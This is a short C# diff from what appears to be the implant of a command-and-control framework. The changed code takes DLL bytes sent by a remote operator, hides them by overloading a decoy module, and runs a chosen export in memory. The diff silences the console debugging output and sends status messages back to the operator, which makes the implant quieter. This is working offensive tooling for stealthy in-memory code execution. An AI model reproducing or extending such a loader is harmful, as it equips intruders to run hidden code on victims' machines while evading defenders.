@@ -34,7 +34,7 @@ namespace Engineer.Commands
                 export = export.TrimStart(' ');
 
                 byte[] dllBytes = task.File;
-                Console.WriteLine($"got {dllBytes.Length} bytes");
+                //Console.WriteLine($"got {dllBytes.Length} bytes");
 
                 //uses dinvoke to map and load any dll, and execute desired functions.
                 // find a decoy
@@ -45,14 +45,16 @@ namespace Engineer.Commands
                     Tasking.FillTaskResults("Error: No suitable decoy found",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
-                Console.WriteLine("found decoy trying to overload module");
+                Tasking.FillTaskResults($"found decoy to overload module", task, EngTaskStatus.Running,TaskResponseType.String);
+                //Console.WriteLine("found decoy trying to overload module");
                 // map the module
                 var map = reprobate.OverloadModule(dllBytes, decoy);
-                Console.WriteLine("module overloaded");
+                //Console.WriteLine("module overloaded");
                 object[] parameters = new object[] { args };
 
                 // run
-                Console.WriteLine("executing dll");
+                Tasking.FillTaskResults($"executing dll", task, EngTaskStatus.Running,TaskResponseType.String);
+                //Console.WriteLine("executing dll");
                 var result = (string)reprobate.CallMappedDLLModuleExport(map.PEINFO, map.ModuleBase, export, typeof(WinApiDynamicDelegate.GenericDelegate), parameters);
 
                 // return output
@@ -60,8 +62,8 @@ namespace Engineer.Commands
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
+                //Console.WriteLine(ex.Message);
+                //Console.WriteLine(ex.StackTrace);
                 Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
             }
         }
